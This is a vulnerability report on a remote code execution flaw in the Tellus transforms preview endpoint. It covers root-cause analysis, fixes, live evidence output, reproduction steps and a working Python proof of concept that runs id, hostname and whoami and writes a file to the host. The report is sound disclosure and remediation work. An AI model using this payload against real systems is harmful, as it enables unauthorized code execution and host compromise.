# Remote Code Execution via Transforms preview/test executes arbitrary Python as the backend user (no publish trust gate, insecure local execution default)

**ID:** vuln-0043
**Severity:** HIGH
**Found:** 2026-08-18 07:15:44 UTC
**Target:** http://host.docker.internal:3000
**Endpoint:** /api/v1/code-repositories/:rid/transforms/preview
**Method:** POST
**CWE:** CWE-94
**CVSS:** 8.8
**Fix Effort:** Medium

## Description

The Tellus transforms pipeline executes user-controlled Python through `POST /api/v1/code-repositories/:rid/transforms/preview` and `POST /api/v1/code-repositories/:rid/transforms/test`. Unlike the Functions publish path, these endpoints are gated only by the Compass `WRITE` (EDITOR/OWNER) check — there is **no** `authorizePublish()` trust gate — and the executor defaults to **local host Python with no container/OS isolation**. Any principal able to write a code repository (and, in the current dev configuration, even a low-privilege viewer via the localhost dev-fallback principal) can therefore run arbitrary operating-system commands as the backend(Node.js) user and read/write the host filesystem.

## Evidence

Live response from `POST /api/v1/code-repositories/ri.stemma.main.repository.87221428-…/transforms/preview` (HTTP 200):

```text
RCE_PROOF id=uid=501(olivierhabimana) gid=20(staff) groups=20(staff),12(everyone),…,80(admin),…
RCE_PROOF hostname=Olivier-HABIMANA.local
RCE_PROOF whoami=olivierhabimana
RCE_PROOF etcpasswd=##|# User Database|#
{"ok": true, "result": {"rid": "/TransRCE/poc-output", "rowCount": 3, "columns": ["marker"], "mode": "replace", "path": "…/tellus-transform-out-…/output.csv"}}
```

Second transform (`transforms/poc2.py`):
```text
RCE2 WRITE_OK /tmp/tellus_transform_pwn.txt
RCE2 env_db=NO_DB_CREDS_IN_ENV
RCE2 env_secret_keys=NONE
```

Gating contrast (viewer JWT, same repo):
- With `X-Tellus-Test-Principal: <sub>/VIEWER` → `HTTP 404` (Compass WRITE correctly denies a real viewer).
- Without the header → `HTTP 200` + the RCE output above (localhost dev-fallback principal substitutes EDITOR + tellus-superadmin; `CODE_REPOS_TEST_AUTH=1`, `NODE_ENV=development`, `TELLUS_TEST_HOOKS=1` are set in the running app).
- A repo EDITOR (intended actor) reproduces RCE unconditionally, establishing that the primitive does not depend solely on the dev fallback.

The child environment carried no database credentials (`filterEnv()` whitelist works); code execution and host filesystem write as user `olivierhabimana` (uid 501) are nevertheless fully demonstrated.

## Impact

Full arbitrary code execution in the context of the backend Node process. Demonstrated live: `id` returns `uid=501(olivierhabimana) gid=20(staff)…`; `whoami` returns `olivierhabimana`; `hostname` returns `Olivier-HABIMANA.local`; `/etc/passwd` is read; an arbitrary file `/tmp/tellus_transform_pwn.txt` is written to the host filesystem. The attacker inherits all of the Node user's filesystem permissions and can pivot to adjacent services, persistence, and lateral movement. (In the current default the code runs in an unsandboxed local child process, not a container.) The spawned child's environment is correctly scrubbed of DB credentials by `filterEnv()`, so primary DB env credentials are not directly leaked — but the code executes with the full authority of the API user and its filesystem access.

## Technical Analysis

**Gating asymmetry (root cause).** Tellus treats a published TypeScript Function as high-trust: publication requires `authorizePublish()` (`src/services/functions/executionPolicy.ts`) — a Keycloak `function:publish` role, an active `function_publish_grants` DB row, the legacy env allowlist, or open-development mode — and every decision is audit-logged, because the Function executor (`worker_threads` + `vm`) is explicitly documented as **not** a security boundary. The transform pipeline executes the same trust class of attacker code (arbitrary Python driving PySpark / host OS) but is protected only by `requireOperation({ operation: "WRITE" })` (`src/services/codeRepository/transforms/routes.ts`), whose `DEFAULT_POLICY` (`src/services/codeRepos/middleware/compass.ts:70`) allows WRITE whenever `principal.roles` contains `OWNER` or `EDITOR`. No `authorizePublish()`, no `function:publish` role, no `function_publish_grants` check exists anywhere on the transform path.

**Insecure default execution.** `executionMode()` (`src/services/codeRepository/transforms/executor.ts:43`) returns `"local"` unless `TELLUS_TRANSFORM_EXECUTION_MODE=container` is set. In local mode `runChild()` (executor.ts:498) `spawn(resolveTransformPython(), [driverPath], { cwd: workdir, env: filterEnv()+TELLUS_TRANSFORM_JOB })` — an ordinary host child process with no `--network=none`, no `--read-only`, no resource caps other than a timeout, and no user namespace.

**No-commit arbitrary code.** `runTransformPreview` (`src/services/codeRepository/transforms/previewHarness.ts:176-183`) merges request-supplied `fileOverrides` over the committed tree and passes the merged sources to `executeTransform` (previewHarness.ts:241), so even the repo-commit step is optional; an `entryPoint` + `fileOverrides` containing a `@transform_pandas(output=Output(...))` is discovered and its `compute()` body invoked.

The Python driver (`driver.py`) emits its result JSON as the **last** stdout line; any attacker `print()` precedes it and is returned verbatim in the preview response `stdout`, giving a clean read-back channel for recon output even though the executor subsequently reports "transform produced no parseable result".

## Proof of Concept

Steps to reproduce end-to-end (llustrating repo-write path; the `fileOverrides` variant omits steps 1–2 entirely):
1. Authenticate as any principal with repository WRITE (e.g. an EDITOR; in the observed dev config a bare viewer JWT also succeeds because the request reaches the app as localhost and the CODE_REPOS_TEST_AUTH dev-fallback principal substitutes EDITOR+tellus-superadmin).
2. Create a code repository (`POST /api/v1/code-repositories`) and commit `transforms/poc.py` (below) via `POST /:rid/branches/:branch/commits` with an `If-Match` of the current head SHA.
3. Call `POST /api/v1/code-repositories/:rid/transforms/preview` with `{"branch":"main","entryPoint":"compute","sourcePath":"transforms/poc.py"}`.
4. Read the command output from the response `stdout` field (the transform's `print()` lines precede the trailing driver JSON).

````python
# transforms/poc.py — committed to the repo (or supplied via fileOverrides)
from transforms.api import transform_pandas, Output
import os, subprocess, pandas as pd

@transform_pandas(output=Output("/TransRCE/poc-output"))
def compute(ctx):
    uid  = subprocess.run(["id"], capture_output=True, text=True).stdout.strip()
    host = subprocess.run(["hostname"], capture_output=True, text=True).stdout.strip()
    who  = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
    print("RCE_PROOF id=" + uid)
    print("RCE_PROOF hostname=" + host)
    print("RCE_PROOF whoami=" + who)
    with open("/tmp/tellus_transform_pwn.txt", "w") as f:
        f.write("pwned-by-transform uid=%d" % os.getuid())
    return pd.DataFrame({"marker": [uid, host, who]})
```
````

## Remediation

Two independent, complementary fixes:
1. Apply the publish trust gate to transform execution. Before running any transform (preview, dry-run/test, or enqueued build), require `authorizePublish()` (or an equivalent `authorizeExecute()`) from `src/services/functions/executionPolicy.ts` using the caller's `codeReposPrincipal`. Transform code is at least as powerful as a published Function; it must not be executable by a bare repo EDITOR. Thread the resulting decision (and fail-closed on error) into `runTransformPreview`/`runTransformDryRun`/`startBuild`.
2. Default to isolated execution and fail closed. Make `executionMode()` return `"container"` unless an explicit `TELLUS_TRANSFORM_ALLOW_LOCAL=1` opt-in AND a non-production `NODE_ENV` both permit local; wire `containerImageAvailable()` into `preflightTransformRuntime()` so a missing runtime fails loudly instead of silently running on the host. Additionally, when `fileOverrides` is present, require the trust-gate decision before `executeTransform()` (defense-in-depth).

## Assumptions

The viewer/low-priv-live path observed here is CONDITIONAL on the request reaching the API as localhost with `CODE_REPOS_TEST_AUTH=1` + `TELLUS_TEST_HOOKS=1` + `NODE_ENV=development` (the current deployment) so the dev-fallback principal substitutes an EDITOR+tellus-superadmin identity. Independently of that dev configuration, any principal with repository WRITE (EDITOR/OWNER) — a normal user role — reaches the same code execution by design, so the missing trust-gate + non-isolated default remains a real vulnerability even with the dev-fallback disabled.
